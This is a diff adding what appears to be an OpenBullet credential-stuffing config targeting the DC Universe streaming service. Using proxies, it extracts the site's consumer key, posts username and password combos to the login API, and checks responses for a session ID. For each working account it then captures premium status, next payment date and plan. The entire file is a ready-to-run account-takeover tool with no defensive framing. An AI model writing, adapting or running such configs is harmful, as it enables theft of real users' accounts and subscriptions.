@@ -1,0 +1,90 @@
+[SETTINGS]
+{
+  "Name": "DCUniverse",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-07-24T16:33:55.6219464+05:30",
+  "AdditionalInfo": "",
+  "Author": "Neo#0516",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://www.dcuniverse.com/api/5/consumer/www" 
+  
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
+  HEADER "Referer: https://www.dcuniverse.com/" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" JSON "consumer_secret" JTokenParsing=TRUE -> VAR "secret" 
+
+REQUEST GET "https://www.dcuniverse.com/api/users/login" 
+  
+  HEADER "Content-Length: 60" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://www.dcuniverse.com" 
+  HEADER "X-Consumer-Key: <secret>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Referer: https://www.dcuniverse.com/login" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+REQUEST POST "https://www.dcuniverse.com/api/users/login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 60" 
+  HEADER "Accept: application/json" 
+  HEADER "Origin: https://www.dcuniverse.com" 
+  HEADER "X-Consumer-Key: <secret>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Referer: https://www.dcuniverse.com/login" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" JSON "session_id" -> VAR "session_id" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"result\": {\"session_id\": \"" 
+  KEYCHAIN Failure OR 
+    KEY "The email address or password is incorrect. Please try again\", \"message\":" 
+
+REQUEST GET "https://www.dcuniverse.com/api/premium/1/subscriptions" 
+  
+  HEADER "Accept: application/json" 
+  HEADER "Authorization: Token <session_id>" 
+  HEADER "X-Consumer-Key: <secret>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36" 
+  HEADER "Referer: https://www.dcuniverse.com/login" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+PARSE "<SOURCE>" JSON "premium_status" -> CAP "Is Premium?" 
+
+PARSE "<SOURCE>" JSON "premium_next_pay_date" -> CAP "Expiry Date" 
+
+PARSE "<SOURCE>" JSON "merchant_plan_id" -> CAP "Plan Name" 
+
